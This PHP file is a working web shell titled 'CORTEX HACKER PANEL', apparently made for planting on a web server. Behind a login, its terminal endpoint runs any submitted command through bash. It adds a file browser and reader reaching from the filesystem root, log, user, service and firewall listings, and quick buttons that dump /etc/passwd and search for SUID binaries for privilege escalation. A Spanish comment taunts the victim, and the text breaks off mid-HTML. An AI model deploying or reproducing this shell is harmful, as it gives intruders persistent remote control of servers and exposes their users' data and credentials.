<?php
// =============================================
// CORTEX HACKER PANEL v4.0 - by gstxx
// Native PTY-like Terminal + Smart Security
// =============================================
session_start();
error_reporting(0);

// === SECURITY & CONFIG ===
// Bcrypt hashes
$CRED_USER_HASH = '$2y$12$2y8rjUH/JDy4NG8zTJCuTenvF2/tCTjjr14C..0Cw3Xbk9LTAodPC';
$CRED_PASS_HASH = '$2y$12$xTPkl1IdeL04El..UC.aEemlfh67LogZBInJi8nmGRFJQvr1F.3US';

// Smart Security: Rate Limiting & Anti-Brute Force
$ip_hash = md5($_SERVER['REMOTE_ADDR']);
$lock_file = sys_get_temp_dir() . '/cortex_lock_' . $ip_hash;
$attempts = 0;

if (file_exists($lock_file)) {
    $lock_data = explode('|', @file_get_contents($lock_file));
    if (count($lock_data) === 2 && $lock_data[1] === 'LOCKED') {
        if (time() < (int) $lock_data[0]) {
            header("HTTP/1.1 429 Too Many Requests");
            die("IP LOCKED. SECURITY MEASURES ENGAGED.");
        } else {
            @unlink($lock_file);
        }
    } else {
        $attempts = (int) $lock_data[0];
    }
}

// === LOGOUT ===
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// === AUTHENTICATION ===
if (!isset($_SESSION['authenticated'])) {
    $err = null;
    if (isset($_POST['login'])) {
        sleep(1); // Anti-timing / brute force delay
        $u = trim($_POST['username'] ?? '');
        $p = trim($_POST['password'] ?? '');

        // Use proper bcrypt verification
        if (password_verify($u, $CRED_USER_HASH) && password_verify($p, $CRED_PASS_HASH)) {
            $_SESSION['authenticated'] = true;
            $_SESSION['login_time'] = time();
            @unlink($lock_file); // Reset attempts
            $_SESSION['term_cwd'] = '/home/' . get_current_user(); // Init terminal CWD
            if (!is_dir($_SESSION['term_cwd']))
                $_SESSION['term_cwd'] = '/tmp';
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $attempts++;
            if ($attempts >= 5) {
                @file_put_contents($lock_file, (time() + 300) . '|LOCKED'); // 5 min lockout
                die("SECURITY BREACH DETECTED. SYSTEM LOCKED.");
            } else {
                @file_put_contents($lock_file, $attempts);
            }
            $err = "ACCESS DENIED";
        }
    }
    showLogin($err);
    exit;
}
// Nunca te voy a dejar en paz, pase lo que pase.
// atento que soy gstxx
// === SYSTEM INFO FUNCTIONS ===
function cmd($c)
{
    $o = @shell_exec($c . ' 2>/dev/null');
    return $o !== null ? trim($o) : '';
}

function getSystemInfo()
{
    $i = [];
    $load = sys_getloadavg();
    $cores = intval(cmd("nproc")) ?: 1;
    $i['cpu'] = [
        'usage' => min(round($load[0] * 100 / $cores, 1), 100),
        'cores' => $cores,
        'load' => $load,
        'model' => cmd("grep 'model name' /proc/cpuinfo|head -1|cut -d: -f2") ?: 'Unknown',
    ];
    $m = preg_split('/\s+/', cmd("free -m|grep Mem"));
    $mt = intval($m[1] ?? 0);
    $mu = intval($m[2] ?? 0);
    $i['mem'] = ['total' => $mt, 'used' => $mu, 'free' => $mt - $mu, 'pct' => $mt > 0 ? round($mu / $mt * 100, 1) : 0];

    $sw = preg_split('/\s+/', cmd("free -m|grep Swap"));
    $st = intval($sw[1] ?? 0);
    $su = intval($sw[2] ?? 0);
    $i['swap'] = ['total' => $st, 'used' => $su, 'pct' => $st > 0 ? round($su / $st * 100, 1) : 0];

    $nv = cmd("nvidia-smi --query-gpu=utilization.gpu,memory.total,memory.used,temperature.gpu,name --format=csv,noheader,nounits");
    if ($nv) {
        $g = array_map('trim', explode(',', $nv));
        $i['gpu'] = ['usage' => intval($g[0] ?? 0), 'mem_total' => round(($g[1] ?? 0) / 1024, 1), 'mem_used' => round(($g[2] ?? 0) / 1024, 1), 'temp' => $g[3] ?? 0, 'name' => $g[4] ?? 'GPU'];
    } else {
        $i['gpu'] = ['usage' => 0, 'name' => 'No GPU', 'mem_total' => 0, 'mem_used' => 0, 'temp' => 0];
    }

    $ifs = [];
    foreach (explode("\n", cmd("ip -o addr show|grep 'inet '|awk '{print $2,$4}'")) as $l) {
        if (empty(trim($l)))
            continue;
        $p = explode(' ', trim($l));
        if (count($p) >= 2)
            $ifs[] = ['n' => $p[0], 'ip' => explode('/', $p[1])[0]];
    }
    $i['net'] = $ifs;
    $i['host'] = cmd("hostname") ?: 'localhost';
    $i['up'] = cmd("uptime -p") ?: 'N/A';
    $i['kern'] = cmd("uname -r") ?: 'N/A';
    $i['os'] = cmd("grep PRETTY_NAME /etc/os-release|cut -d= -f2|tr -d '\"'") ?: 'Linux';
    $i['arch'] = cmd("uname -m") ?: 'N/A';
    $i['user'] = cmd("whoami") ?: 'N/A';
    $i['priv'] = cmd("id") ?: 'N/A';

    $disks = [];
    foreach (explode("\n", cmd("df -h|grep '^/dev'")) as $dl) {
        if (empty(trim($dl)))
            continue;
        $dp = preg_split('/\s+/', trim($dl));
        if (count($dp) >= 6)
            $disks[] = ['dev' => $dp[0], 'size' => $dp[1], 'used' => $dp[2], 'avail' => $dp[3], 'pct' => intval($dp[4]), 'mount' => $dp[5]];
    }
    $i['disks'] = $disks;
    return $i;
}

function getProcesses($sort = 'cpu', $count = 25)
{
    $s = $sort === 'mem' ? '-%mem' : '-%cpu';
    $o = cmd("ps aux --sort=$s|head -" . ($count + 1));
    $ps = [];
    foreach (explode("\n", $o) as $n => $l) {
        if ($n === 0 || empty(trim($l)))
            continue;
        $p = preg_split('/\s+/', trim($l), 11);
        if (count($p) >= 11)
            $ps[] = ['u' => $p[0], 'pid' => $p[1], 'cpu' => $p[2], 'mem' => $p[3], 'vsz' => $p[4], 'rss' => $p[5], 'stat' => $p[7], 'start' => $p[8], 'time' => $p[9], 'cmd' => $p[10]];
    }
    return $ps;
}

function getConnections()
{
    $o = cmd("ss -tunap|tail -n +2|head -40");
    $cs = [];
    foreach (explode("\n", $o) as $l) {
        if (empty(trim($l)))
            continue;
        $p = preg_split('/\s+/', trim($l));
        if (count($p) >= 5)
            $cs[] = ['proto' => $p[0], 'state' => $p[1], 'local' => $p[4] ?? '', 'foreign' => $p[5] ?? '', 'proc' => $p[6] ?? ''];
    }
    return $cs;
}

function fileBrowser($path)
{
    if (empty($path))
        $path = '/';
    $path = realpath($path) ?: '/'; // Will fall back to root if invalid
    $items = [];
    if (@is_dir($path) && $dh = @opendir($path)) {
        while (($f = readdir($dh)) !== false) {
            if ($f === '.' && $path !== '/')
                continue; // keep ..
            $fp = $path === '/' ? '/' . $f : $path . '/' . $f;
            $stat = @stat($fp);
            $items[] = [
                'name' => $f,
                'path' => $fp,
                'dir' => @is_dir($fp),
                'size' => @is_file($fp) ? @filesize($fp) : 0,
                'perms' => @file_exists($fp) ? substr(sprintf('%o', @fileperms($fp)), -4) : '????',
                'mtime' => date('Y-m-d H:i', $stat['mtime'] ?? 0),
            ];
        }
        closedir($dh);
    }
    usort($items, function ($a, $b) {
        if ($a['name'] === '..')
            return -1;
        if ($b['name'] === '..')
            return 1;
        if ($a['dir'] !== $b['dir'])
            return $b['dir'] - $a['dir'];
        return strcasecmp($a['name'], $b['name']);
    });
    return ['path' => $path, 'items' => $items];
}

function readFileContent($path, $maxBytes = 65536)
{
    if (!is_file($path) || !is_readable($path))
        return ['error' => 'Cannot read file'];
    $size = filesize($path);
    $mime = mime_content_type($path) ?: 'application/octet-stream';
    $binary = (strpos($mime, 'text') === false && strpos($mime, 'json') === false && strpos($mime, 'xml') === false && strpos($mime, 'javascript') === false && strpos($mime, 'php') === false);
    if ($binary)
        return ['path' => $path, 'size' => $size, 'mime' => $mime, 'binary' => true, 'content' => '[Binary file: ' . $mime . ']'];
    $content = file_get_contents($path, false, null, 0, $maxBytes);
    return ['path' => $path, 'size' => $size, 'mime' => $mime, 'binary' => false, 'content' => $content, 'truncated' => $size > $maxBytes];
}

// === AJAX API ===
if (isset($_GET['api'])) {
    header('Content-Type: application/json');
    if (!isset($_SESSION['authenticated'])) {
        echo json_encode(['error' => 'Unauthorized']);
        exit;
    }
    $a = $_GET['api'];

    // --- SMART INTERACTIVE TERMINAL BACKEND ---
    if ($a === 'term_exec') {
        $c = $_POST['cmd'] ?? '';
        $cwd = $_SESSION['term_cwd'] ?? '/tmp';

        // Handle cd internally to keep state
        if (preg_match('/^cd\s+(.*)$/', trim($c), $m)) {
            $target = trim($m[1]);
            // resolve tilde to home
            if ($target === '~' || strpos($target, '~/') === 0) {
                $u_p = explode('/', $target)[0];
                $home = cmd("eval echo ~" . escapeshellarg($u_p !== '~' ? substr($u_p, 1) : ""));
                $target = str_replace('~', $home, $target);
            }
            $new_cwd = realpath($cwd . '/' . $target) ?: realpath($target);
            if ($new_cwd && is_dir($new_cwd)) {
                $_SESSION['term_cwd'] = $new_cwd;
                echo json_encode(['output' => '', 'cwd' => $new_cwd, 'user' => get_current_user(), 'host' => gethostname()]);
            } else {
                echo json_encode(['output' => "bash: cd: $target: No such file or directory\n", 'cwd' => $cwd, 'user' => get_current_user(), 'host' => gethostname()]);
            }
            exit;
        }

        // Force ANSI color generation if commands support it
        $c = "export TERM=xterm-256color; export FORCE_COLOR=1; export CLICOLOR_FORCE=1; " . $c;

        // Use bash wrapping and script to fake a PTY and get colors where possible
        // To avoid hangs on interactive commands, we use timeout
        $ds = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
        $pr = proc_open("timeout 20 bash -c " . escapeshellarg($c), $ds, $pipes, $cwd, ['TERM' => 'xterm-256color']);
        $out = '';
        if (is_resource($pr)) {
            fclose($pipes[0]);
            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);

            // Loop with timeout to read
            $start = time();
            while (!feof($pipes[1]) || !feof($pipes[2])) {
                $out .= fread($pipes[1], 8192);
                $out .= fread($pipes[2], 8192);
                if (time() - $start > 20)
                    break;
                usleep(50000); // 50ms pause
            }
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($pr);
        } else {
            $out = "Execution failed\n";
        }
        echo json_encode(['output' => $out, 'cwd' => $cwd, 'user' => get_current_user(), 'host' => gethostname()]);
        exit;
    }

    if ($a === 'term_tab') {
        $c = $_POST['cmd'] ?? '';
        $cwd = $_SESSION['term_cwd'] ?? '/tmp';
        // Basic compgen wrapper
        $parts = explode(' ', $c);
        $last = array_pop($parts);
        if (empty($last)) {
            echo json_encode(['matches' => []]);
            exit;
        }
        // If it looks like a path or command
        $cmd = "compgen -A file -A directory -c -- " . escapeshellarg($last);
        $out = @shell_exec("cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>/dev/null | head -n 50");
        $matches = [];
        if ($out) {
            foreach (explode("\n", trim($out)) as $m) {
                if (trim($m) !== '')
                    $matches[] = trim($m);
            }
        }
        echo json_encode(['matches' => array_values(array_unique($matches))]);
        exit;
    }

    if ($a === 'term_cwd') {
        echo json_encode(['cwd' => $_SESSION['term_cwd'] ?? '/tmp', 'user' => get_current_user(), 'host' => gethostname()]);
        exit;
    }
    // --- END TERMINAL ---

    switch ($a) {
        case 'sysinfo':
            echo json_encode(getSystemInfo());
            break;
        case 'processes':
            echo json_encode(getProcesses($_GET['sort'] ?? 'cpu', intval($_GET['count'] ?? 25)));
            break;
        case 'connections':
            echo json_encode(getConnections());
            break;
        case 'filebrowser':
            echo json_encode(fileBrowser($_GET['path'] ?? '/'));
            break;
        case 'readfile':
            echo json_encode(readFileContent($_GET['path'] ?? ''));
            break;
        case 'logs':
            $type = $_GET['type'] ?? 'syslog';
            $logFiles = ['syslog' => '/var/log/syslog', 'auth' => '/var/log/auth.log', 'kern' => '/var/log/kern.log', 'dpkg' => '/var/log/dpkg.log'];
            if ($type === 'dmesg')
                $data = cmd("dmesg|tail -50");
            elseif ($type === 'journal')
                $data = cmd("journalctl -n 50 --no-pager 2>/dev/null");
            elseif (isset($logFiles[$type]))
                $data = cmd("tail -50 " . escapeshellarg($logFiles[$type]) . " 2>/dev/null") ?: 'Log not available/readable';
            else
                $data = 'Unknown log type';
            echo json_encode(['data' => $data, 'type' => $type]);
            break;
        case 'users':
            $us = [];
            foreach (explode("\n", cmd("cat /etc/passwd|grep -v nologin|grep -v /bin/false")) as $l) {
                if ($p = explode(':', $l)) if (count($p) >= 7)
                    $us[] = ['name' => $p[0], 'uid' => $p[2], 'gid' => $p[3], 'home' => $p[5], 'shell' => $p[6]];
            }
            echo json_encode($us);
            break;
        case 'lastlogins':
            echo json_encode(['data' => cmd("last -20") ?: 'No records']);
            break;
        case 'services':
            echo json_encode(['data' => cmd("systemctl list-units --type=service --state=running --no-pager|head -40")]);
            break;
        case 'firewall':
            echo json_encode(['data' => cmd("iptables -L -n 2>/dev/null") ?: cmd("ufw status verbose 2>/dev/null") ?: 'No permissions/data']);
            break;
        default:
            echo json_encode(['error' => 'Unknown API']);
            break;
    }
    exit;
}

$SI = getSystemInfo();
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($SI['host']); ?> // CORTEX PANEL</title>
    <style>
        /* Minified CSS */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box
        }

        :root {
            --c1: #00ff41;
            --c2: #00cc33;
            --c3: #009922;
            --bg: #0a0a0f;
            --bg2: #0d0d14;
            --bg3: #12121c;
            --bg4: #1a1a28;
            --red: #ff0040;
            --cyan: #00e5ff;
            --orange: #ff9100;
            --purple: #d500f9;
            --yellow: #ffea00;
            --border: #1e1e2e;
            --font: 'Courier New', monospace
        }

        @keyframes flicker {

            0%,
            100% {
                opacity: 1
            }

            50% {
                opacity: .97
            }
        }

        @keyframes pulse-glow {

            0%,
            100% {
                box-shadow: 0 0 5px rgba(0, 255, 65, .2)
            }

            50% {
                box-shadow: 0 0 20px rgba(0, 255, 65, .4)
            }
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px)
            }

            to {
                opacity: 1;
                transform: translateY(0)
            }
        }

        body {
            background: var(--bg);
            color: var(--c1);
            font-family: var(--font);
            font-size: 13px;
            overflow-x: hidden;
            animation: flicker 4s infinite
        }

        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            background: repeating-linear-gradient(0deg, rgba(0, 0, 0, .03) 0px, rgba(0, 0, 0, .03) 1px, transparent 1px, transparent 2px);
            z-index: 9999
        }

        /* HUD */
        .hud-header {
            background: linear-gradient(180deg, var(--bg3), var(--bg));
            border-bottom: 1px solid var(--c3);
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
            backdrop-filter: blur(10px)
        }

        .hud-logo {
            font-size: 1.4rem;
            font-weight: bold;
            text-shadow: 0 0 10px var(--c1);
            display: flex;
            align-items: center;
            gap: 10px
        }

        .hud-logo .pulse-dot {
            width: 8px;
            height: 8px;
            background: var(--c1);
            border-radius: 50%;
            animation: pulse-glow 2s infinite
        }

        .hud-stats {
            display: flex;
            gap: 18px;
            align-items: center;
            font-size: .8rem
        }

        .hud-stat {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px
        }

        .hud-stat-val {
            color: var(--c1);
            text-shadow: 0 0 5px var(--c1)
        }

        .hud-stat-label {
            font-size: .65rem;
            opacity: .5;
            text-transform: uppercase
        }

        .btn-logout {
            background: transparent;
            border: 1px solid var(--red);
            color: var(--red);
            padding: 6px 14px;
            font-family: var(--font);
            font-size: .75rem;
            cursor: pointer;
            transition: all .3s
        }

        .btn-logout:hover {
            background: var(--red);
            color: #000;
            box-shadow: 0 0 15px rgba(255, 0, 64, .5)
        }

        /* NAV */
        .nav-bar {
            display: flex;
            gap: 2px;
            padding: 8px 15px;
            background: var(--bg2);
            border-bottom: 1px solid var(--border);
            overflow-x: auto
        }

        .nav-btn {
            background: transparent;
            border: 1px solid transparent;
            color: var(--c3);
            padding: 8px 16px;
            font-family: var(--font);
            font-size: .75rem;
            cursor: pointer;
            transition: all .3s;
            white-space: nowrap
        }

        .nav-btn:hover {
            color: var(--c1);
            border-color: var(--c3)
        }

        .nav-btn.active {
            color: var(--c1);
            border-color: var(--c1);
            text-shadow: 0 0 8px var(--c1);
            background: rgba(0, 255, 65, .05)
        }

        /* PANELS */
        .main-content {
            padding: 15px;
            min-height: calc(100vh - 100px)
        }

        .section {
            display: none;
            animation: slideIn .3s ease
        }

        .section.active {
            display: block
        }

        .dash-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 12px;
            margin-bottom: 15px
        }

        .dash-grid-wide {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 12px
        }

        .panel {
            background: var(--bg2);
            border: 1px solid var(--border);
            border-radius: 4px;
            overflow: hidden;
            transition: all .3s
        }

        .panel:hover {
            border-color: var(--c3)
        }

        .panel-head {
            background: var(--bg3);
            padding: 10px 14px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center
        }

        .panel-title {
            font-size: .85rem;
            display: flex;
            align-items: center;
            gap: 8px;
            text-shadow: 0 0 5px rgba(0, 255, 65, .3)
        }

        .panel-badge {
            background: var(--c1);
            color: #000;
            padding: 1px 8px;
            font-size: .7rem;
            font-weight: bold;
            border-radius: 2px
        }

        .panel-badge.warn {
            background: var(--orange)
        }

        .panel-badge.crit {
            background: var(--red)
        }

        .panel-body {
            padding: 14px
        }

        /* TABLES & LISTS */
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px solid rgba(255, 255, 255, .03);
            font-size: .8rem
        }

        .info-key {
            opacity: .5
        }

        .tbl {
            width: 100%;
            border-collapse: collapse;
            font-size: .78rem
        }

        .tbl th {
            background: var(--bg3);
            padding: 8px 10px;
            text-align: left;
            border-bottom: 1px solid var(--c3);
            opacity: .7
        }

        .tbl td {
            padding: 7px 10px;
            border-bottom: 1px solid var(--border)
        }

        /* BUTTONS */
        .btn {
            background: transparent;
            border: 1px solid var(--c3);
            color: var(--c1);
            padding: 5px 12px;
            font-family: var(--font);
            font-size: .72rem;
            cursor: pointer;
            transition: all .2s;
            text-transform: uppercase
        }

        .btn:hover {
            background: var(--c1);
            color: #000;
            box-shadow: 0 0 10px rgba(0, 255, 65, .3)
        }

        .btn-sm {
            padding: 3px 8px;
            font-size: .68rem
        }

        .btn-danger {
            border-color: var(--red);
            color: var(--red)
        }

        .btn-danger:hover {
            background: var(--red);
            color: #000
        }

        .btn-cyan {
            border-color: var(--cyan);
            color: var(--cyan)
        }

        .btn-cyan:hover {
            background: var(--cyan);
            color: #000
        }

        /* GAUGES */
        .gauge-wrap {
            display: flex;
            justify-content: center;
            margin-bottom: 12px
        }

        .gauge-svg-wrap {
            position: relative;
            width: 110px;
            height: 110px
        }

        .gauge-svg-wrap svg {
            width: 100%;
            height: 100%;
            transform: rotate(-90deg)
        }

        .gauge-center-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center
        }

        .gauge-pct {
            font-size: 1.4rem;
            font-weight: bold;
            text-shadow: 0 0 10px var(--c1)
        }

        /* COMPONENTS */
        .disk-bar-bg {
            background: var(--bg);
            border: 1px solid var(--border);
            height: 18px;
            margin: 3px 0
        }

        .disk-bar-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--c3), var(--c1));
            transition: width .5s
        }

        .fb-item {
            display: flex;
            padding: 6px 10px;
            border-bottom: 1px solid var(--border);
            font-size: .78rem;
            cursor: pointer;
            gap: 10px
        }

        .fb-item:hover {
            background: rgba(0, 255, 65, .05)
        }

        .log-viewer {
            background: #000;
            color: var(--c2);
            padding: 12px;
            font-size: .78rem;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 500px;
            overflow-y: auto;
            border: 1px solid var(--border)
        }

        .qcmd-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
            gap: 6px
        }

        /* ====== NATIVE TERMINAL CSS ====== */
        .term-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, .95);
            z-index: 5000;
            display: none;
            flex-direction: column
        }

        .term-overlay.active {
            display: flex
        }

        .term-bar {
            background: var(--bg3);
            padding: 8px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--c1)
        }

        .term-bar-title {
            font-size: .85rem;
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--c1)
        }

        .term-body {
            flex: 1;
            background: #050505;
            padding: 15px;
            font-family: var(--font);
            font-size: 14px;
            color: #eee;
            overflow-y: auto;
            position: relative;
            cursor: text
        }

        .term-body-inner {
            display: flex;
            flex-direction: column;
            min-height: 100%
        }

        .term-history {
            white-space: pre-wrap;
            word-break: break-all
        }

        .term-active-line {
            display: flex;
            align-items: flex-start
        }

        .term-prompt {
            color: var(--c1);
            margin-right: 8px;
            font-weight: bold;
            white-space: nowrap
        }

        .term-input-wrap {
            flex: 1;
            position: relative
        }

        .term-input {
            width: 100%;
            background: transparent;
            border: none;
            color: #fff;
            font-family: var(--font);
            font-size: 14px;
            outline: none;
            caret-color: var(--c1)
        }

        .term-status {
            font-size: .7rem;
            opacity: .5;
            padding: 4px 15px;
            background: var(--bg2);
            color: var(--c1)
        }

        .term-color-red {
            color: #ff5555
        }

        .term-color-green {
            color: #50fa7b
        }

        .term-color-yellow {
            color: #f1fa8c
        }

        .term-color-blue {
            color: #bd93f9
        }

        .term-color-cyan {
            color: #8be9fd
        }

        .term-color-bold {
            font-weight: bold
        }

        ::-webkit-scrollbar {
            width: 8px;
            height: 8px
        }

        ::-webkit-scrollbar-track {
            background: var(--bg)
        }

        ::-webkit-scrollbar-thumb {
            background: var(--c3);
            border-radius: 4px
        }
    </style>
</head>

<body>
    <!-- HUD -->
    <div class="hud-header">
        <div class="hud-logo"><span class="pulse-dot"></span> CORTEX PANEL <span
                style="font-size:.6rem;opacity:.4">v4.0</span></div>
        <div class="hud-stats">
            <div class="hud-stat"><span class="hud-stat-val" id="hud-cpu">--</span><span
                    class="hud-stat-label">CPU</span></div>
            <div class="hud-stat"><span class="hud-stat-val" id="hud-mem">--</span><span
                    class="hud-stat-label">MEM</span></div>
            <div class="hud-stat"><span class="hud-stat-val"
                    id="hud-host"><?php echo htmlspecialchars($SI['host']); ?></span><span
                    class="hud-stat-label">HOST</span></div>
            <div class="hud-stat"><span class="hud-stat-val"
                    id="hud-user"><?php echo htmlspecialchars($SI['user']); ?></span><span
                    class="hud-stat-label">USER</span></div>
            <a href="?logout=1" class="btn-logout">⏻ LOGOUT</a>
        </div>
    </div>

    <!-- NAV -->
    <div class="nav-bar">
        <button class="nav-btn active" data-section="dashboard">⚡ DASH</button>
        <button class="nav-btn" data-section="processes">📊 PROC</button>
        <button class="nav-btn" data-section="network">🌐 NET</button>
        <button class="nav-btn" data-section="disks">💿 DISK</button>
        <button class="nav-btn" data-section="files">📁 FILE</button>
        <button class="nav-btn" data-section="logs">📝 LOG</button>
        <button class="nav-btn" data-section="users">👥 USR</button>
        <button class="nav-btn" data-section="services">⚙️ SVC</button>
        <button class="nav-btn" data-section="recon">🔍 REC</button>
        <button class="nav-btn" onclick="openTerminal()" style="color:var(--cyan);border-color:var(--cyan)">💻
            TERM</button>
    </div>

    <div class="main-content">

        <!-- DASHBOARD -->
        <div id="sec-dashboard" class="section active">
            <div class="dash-grid">
                <!-- CPU -->
                <div class="panel">
                    <div class="panel-head"><span class="panel-title">⚡ CPU</span><span class="panel-badge"
                            id="cpu-badge">--</span></div>
                    <div class="panel-body">
                        <div class="gauge-wrap">
                            <div class="gauge-svg-wrap"><svg viewBox="0 0 120 120">
                                    <circle cx="60" cy="60" r="50" fill="none" stroke="var(--border)"
                                        stroke-width="8" />
                                    <circle id="g-cpu" cx="60" cy="60" r="50" fill="none" stroke="var(--c1)"
                                        stroke-width="8" stroke-dasharray="314.16" stroke-dashoffset="314.16"
                                        stroke-linecap="round" />
                                </svg>
                                <div class="gauge-center-text">
                                    <div class="gauge-pct" id="cpu-pct">--%</div>
                                    <div class="gauge-sub">CPU</div>
                                </div>
                            </div>
                        </div>
                        <div class="info-row"><span class="info-key">Model</span><span class="info-val"
                                id="cpu-model"><?php echo htmlspecialchars(trim($SI['cpu']['model'])); ?></span></div>
                        <div class="info-row"><span class="info-key">Cores</span><span class="info-val"
                                id="cpu-cores"><?php echo $SI['cpu']['cores']; ?></span></div>
                    </div>
                </div>
                <!-- RAM -->
                <div class="panel">
                    <div class="panel-head"><span class="panel-title">💾 RAM</span><span class="panel-badge"
                            id="ram-badge">--</span></div>
                    <div class="panel-body">
                        <div class="gauge-wrap">
                            <div class="gauge-svg-wrap"><svg viewBox="0 0 120 120">
                                    <circle cx="60" cy="60" r="50" fill="none" stroke="var(--border)"
                                        stroke-width="8" />
                                    <circle id="g-ram" cx="60" cy="60" r="50" fill="none" stroke="var(--cyan)"
                                        stroke-width="8" stroke-dasharray="314.16" stroke-dashoffset="314.16"
                                        stroke-linecap="round" />
                                </svg>
                                <div class="gauge-center-text">
                                    <div class="gauge-pct" id="ram-pct" style="color:var(--cyan)">--%</div>
                                    <div class="gauge-sub">RAM</div>
                                </div>
                            </div>
                        </div>
                        <div class="info-row"><span class="info-key">Used</span><span class="info-val"
                                id="ram-used"><?php echo $SI['mem']['used']; ?> MB</span></div>
                        <div class="info-row"><span class="info-key">Total</span><span class="info-val"
                                id="ram-total"><?php echo $SI['mem']['total']; ?> MB</span></div>
                    </div>
                </div>
                <!-- SYSTEM -->
                <div class="panel">
                    <div class="panel-head"><span class="panel-title">🖥️ SYSTEM</span></div>
                    <div class="panel-body">
                        <div class="info-row"><span class="info-key">OS</span><span
                                class="info-val"><?php echo htmlspecialchars($SI['os']); ?></span></div>
                        <div class="info-row"><span class="info-key">Kernel</span><span
                                class="info-val"><?php echo htmlspecialchars($SI['kern']); ?></span></div>
                        <div class="info-row"><span class="info-key">Uptime</span><span class="info-val"
                                id="sys-uptime"><?php echo htmlspecialchars($SI['up']); ?></span></div>
                    </div>
                </div>
                <!-- QCMDS -->
                <div class="panel">
                    <div class="panel-head"><span class="panel-title">🚀 QUICK COMMANDS</span></div>
                    <div class="panel-body">
                        <div class="qcmd-grid">
                            <button class="btn" onclick="openTerminalAndRun('id')">WHOAMI</button>
                            <button class="btn" onclick="openTerminalAndRun('netstat -tlnp || ss -tlnp')">PORTS</button>
                            <button class="btn" onclick="openTerminalAndRun('cat /etc/passwd')">PASSWD</button>
                            <button class="btn"
                                onclick="openTerminalAndRun('find / -perm -4000 -type f 2>/dev/null')">SUID
                                BINS</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- PROCESSES -->
        <div id="sec-processes" class="section">
            <div class="panel">
                <div class="panel-head"><span class="panel-title">📊 PROCESOS ACTIVOS</span>
                    <div><button class="btn btn-sm" onclick="loadProcesses('cpu')">Sort CPU</button> <button
                            class="btn btn-sm" onclick="loadProcesses('mem')">Sort MEM</button></div>
                </div>
                <div class="panel-body" style="overflow-x:auto">
                    <table class="tbl" id="proc-tbl">
                        <thead>
                            <tr>
                                <th>PID</th>
                                <th>USER</th>
                                <th>CPU%</th>
                                <th>MEM%</th>
                                <th>STAT</th>
                                <th>TIME</th>
                                <th>COMMAND</th>
                                <th>ACTION</th>
                            </tr>
                        </thead>
                        <tbody></tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- NETWORK -->
        <div id="sec-network" class="section">
            <div class="panel">
                <div class="panel-head"><span class="panel-title">🔗 ACTIVE CONNECTIONS</span><button class="btn btn-sm"
                        onclick="loadConnections()">Refresh</button></div>
                <div class="panel-body" style="overflow-x:auto">
                    <table class="tbl" id="conn-tbl">
                        <thead>
                            <tr>
                                <th>PROTO</th>
                                <th>STATE</th>
                                <th>LOCAL</th>
                                <th>REMOTE</th>
                                <th>PROCESS</th>
                            </tr>
                        </thead>
                        <tbody></tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- DISKS -->
        <div id="sec-disks" class="section">
            <div class="panel">
                <div class="panel-head"><span class="panel-title">💿 DISK USAGE</span></div>
                <div class="panel-body" id="disks-content"></div>
            </div>
        </div>

        <!-- FILES -->
        <div id="sec-files" class="section">
            <div class="panel">
                <div class="panel-head"><span class="panel-title">📁 FILE BROWSER</span></div>
                <div class="panel-body">
                    <div style="display:flex;gap:10px;margin-bottom:10px"><input type="text" id="fb-path-input"
                            value="/"
                            style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--c1);padding:5px;"
                            onkeydown="if(event.key==='Enter')fbGo(this.value)"><button class="btn btn-sm"
                            onclick="fbGo(document.getElementById('fb-path-input').value)">GO</button></div>
                    <div id="fb-list"></div>
                    <div id="fb-file-viewer" style="display:none;margin-top:10px">
                        <div style="display:flex;justify-content:space-between;margin-bottom:8px"><span
                                id="fb-file-name" style="color:var(--cyan)"></span><button class="btn btn-sm btn-danger"
                                onclick="document.getElementById('fb-file-viewer').style.display='none'">CLOSE</button>
                        </div>
                        <div class="log-viewer" id="fb-file-content"></div>
                    </div>
                </div>
            </div>
        </div>

        <!-- LOGS -->
        <div id="sec-logs" class="section">
            <div class="panel">
                <div class="panel-head"><span class="panel-title">📝 SYSTEM LOGS</span>
                    <div><button class="btn btn-sm" onclick="loadLog('syslog')">Syslog</button> <button
                            class="btn btn-sm" onclick="loadLog('auth')">Auth</button> <button class="btn btn-sm"
                            onclick="loadLog('kern')">Kernel</button></div>
                </div>
                <div class="panel-body">
                    <pre class="log-viewer" id="log-content">Select a log...</pre>
                </div>
            </div>
        </div>

        <!-- USERS -->
        <div id="sec-users" class="section">
            <div class="dash-grid-wide">
                <div class="panel">
                    <div class="panel-head"><span class="panel-title">👥 LOCAL USERS</span></div>
